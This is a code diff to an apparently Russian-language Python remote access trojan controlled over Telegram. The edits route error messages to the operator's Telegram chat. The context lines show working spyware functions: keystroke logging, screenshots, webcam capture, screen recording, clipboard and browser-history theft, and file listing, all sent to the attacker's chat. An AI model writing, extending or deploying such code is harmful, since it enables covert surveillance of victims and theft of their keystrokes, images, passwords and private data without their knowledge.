@@ -25,7 +25,7 @@ LOCK_FILE = "tgrat.lock"
 def acquire_lock():
     try:
         lock = open(LOCK_FILE, "w")
-        if os.name == 'nt':  # Windows
+        if os.name == 'nt':
             import msvcrt
             msvcrt.locking(lock.fileno(), msvcrt.LK_NBLCK, 1)
         else:
@@ -36,7 +36,14 @@ def acquire_lock():
         print("Другая копия бота уже запущена!")
         sys.exit(1)
 
-# ========================== ЛОГИ + ЗАПИСЬ ОШИБОК ==========================
+# ========================== ОТПРАВКА ОШИБОК В ТЕЛЕГРАМ ==========================
+def send_error_to_bot(error_text):
+    try:
+        bot.send_message(ADMIN_ID, f"❌ Ошибка в RAT:\n{error_text}")
+    except:
+        pass  # если даже отправка упадёт — молчим
+
+# ========================== ЛОГИ ==========================
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(message)s',
@@ -45,12 +52,6 @@ logging.basicConfig(
         logging.StreamHandler(sys.stdout)
     ]
 )
-
-def log_error(msg):
-    with open("tgrat_errors.log", "a", encoding="utf-8") as f:
-        f.write(f"[{datetime.datetime.now()}] {msg}\n")
-        import traceback
-        f.write(traceback.format_exc() + "\n\n")
 
 if sys.platform.startswith("win"):
     import ctypes
@@ -81,7 +82,7 @@ def on_press(key):
         with keylog_lock:
             keylog_lines.append(f"{ts} | {char}")
     except Exception as e:
-        log_error(f"Keylog error: {e}")
+        send_error_to_bot(f"Keylog error: {e}")
 
 def send_keylog():
     with keylog_lock:
@@ -92,7 +93,7 @@ def send_keylog():
             bot.send_message(ADMIN_ID, f"⌨️ Кейлог:\n```\n{text}\n```", parse_mode="Markdown")
             keylog_lines.clear()
         except Exception as e:
-            log_error(f"Send keylog error: {e}")
+            send_error_to_bot(f"Send keylog error: {e}")
 
 def auto_send_keylog():
     while True:
@@ -100,7 +101,7 @@ def auto_send_keylog():
         if keylog_active:
             send_keylog()
 
-# ========================== ПРОВЕРКА DOWNLOADS (замена watchdog) ==========================
+# ========================== ПРОВЕРКА DOWNLOADS ==========================
 last_downloads = set()
 
 def check_downloads():
@@ -167,6 +168,7 @@ def get_browser_history(browser="chrome", limit=10):
                         return "\n".join([f"{datetime.datetime(1970,1,1) + datetime.timedelta(microseconds=r[2]):%Y-%m-%d %H:%M} → {r[1]} → {r[0]}" for r in rows])
             return "Профиль Firefox не найден"
     except Exception as e:
+        send_error_to_bot(f"Browser history error ({browser}): {e}")
         return f"Ошибка {browser}: {str(e)}"
 
 # ========================== SYSINFO ==========================
@@ -211,7 +213,7 @@ def cmd_start(message):
     )
     bot.send_message(message.chat.id, "🚀 RAT онлайн и стабилен.\nВыбирай:", reply_markup=markup)
 
-# ========================== КОМАНДЫ ==========================
+# ========================== КОМАНДЫ С ЗАЩИТОЙ ==========================
 @bot.message_handler(commands=['screenshot'])
 def cmd_screenshot(message):
     if not is_admin(message.from_user.id): return
@@ -222,8 +224,8 @@ def cmd_screenshot(message):
             bot.send_photo(message.chat.id, f, caption="📸 Скриншот")
         os.remove(path)
     except Exception as e:
-        log_error(f"Screenshot error: {e}")
-        bot.reply_to(message, f"❌ {e}")
+        send_error_to_bot(f"Screenshot error: {e}")
+        bot.reply_to(message, f"❌ Ошибка скриншота")
 
 @bot.message_handler(commands=['webcam'])
 def cmd_webcam(message):
@@ -241,8 +243,8 @@ def cmd_webcam(message):
             bot.send_photo(message.chat.id, f, caption="📷 Веб-камера")
         os.remove(path)
     except Exception as e:
-        log_error(f"Webcam error: {e}")
-        bot.reply_to(message, f"❌ {e}")
+        send_error_to_bot(f"Webcam error: {e}")
+        bot.reply_to(message, f"❌ Ошибка вебки")
 
 @bot.message_handler(commands=['screenrec_start'])
 def cmd_screenrec_start(message):
@@ -273,9 +275,7 @@ def record_screen(duration):
                 bot.send_video(ADMIN_ID, v, caption=f"🎥 Запись завершена ({duration} сек)")
             os.remove(screenrec_filename)
     except Exception as e:
-        log_error(f"Screen rec error: {e}")
-    finally:
-        screenrec_active = False
+        send_error_to_bot(f"Screen recording error: {e}")
 
 @bot.message_handler(commands=['screenrec_stop'])
 def cmd_screenrec_stop(message):
@@ -319,8 +319,8 @@ def cmd_clip(message):
         text = pyperclip.paste()
         bot.reply_to(message, f"📋 Буфер обмена:\n{text[:3500]}")
     except Exception as e:
-        log_error(f"Clip error: {e}")
-        bot.reply_to(message, f"❌ {e}")
+        send_error_to_bot(f"Clip error: {e}")
+        bot.reply_to(message, f"❌ Ошибка буфера")
 
 @bot.message_handler(commands=['browser_all'])
 def cmd_browser_all(message):
@@ -363,13 +363,13 @@ def cmd_files(message):
             text = text[:3700] + "\n... (обрезано)"
         bot.reply_to(message, f"📂 Файлы в {path}:\n```\n{text}\n```", parse_mode="Markdown")
     except Exception as e:
-        log_error(f"Files error: {e}")
-        bot.reply_to(message, f"❌ {e}")
+        send_error_to_bot(f"Files error: {e}")
+        bot.reply_to(message, f"❌ Ошибка файлов")
 
 @bot.message_handler(commands=['status'])
 def cmd_status(message):
     if not is_admin(message.from_user.id): return
-    bot.reply_to(message, f"🟢 RAT онлайн\nКейлоггер: {'ВКЛ' if keylog_active else 'ВЫКЛ'}\nВерсия: stable")
+    bot.reply_to(message, f"🟢 RAT онлайн\nКейлоггер: {'ВКЛ' if keylog_active else 'ВЫКЛ'}")
 
 @bot.message_handler(commands=['restart'])
 def cmd_restart(message):
@@ -377,9 +377,9 @@ def cmd_restart(message):
     bot.reply_to(message, "🔄 Перезапуск...")
     os.execv(sys.executable, ['python'] + sys.argv)
 
-# ========================== ЗАПУСК ==========================
+# ========================== ЗАПУСК С УВЕЛИЧЕННЫМ ТАЙМАУТОМ ==========================
 if __name__ == '__main__':
-    lock = acquire_lock()   # Защита от двойного запуска
+    lock = acquire_lock()
 
     logging.info("=== RAT УСПЕШНО ЗАПУЩЕН ===")
 
@@ -389,7 +389,9 @@ if __name__ == '__main__':
 
     while True:
         try:
-            bot.polling(none_stop=True, interval=0, timeout=30)
+            bot.polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=100)
         except Exception as e:
-            logging.error(f"Polling error: {e}")
-            time.sleep(5)
+            error_text = f"Polling error: {str(e)}"
+            logging.error(error_text)
+            send_error_to_bot(error_text)
+            time.sleep(10)  # пауза перед перезапуском polling
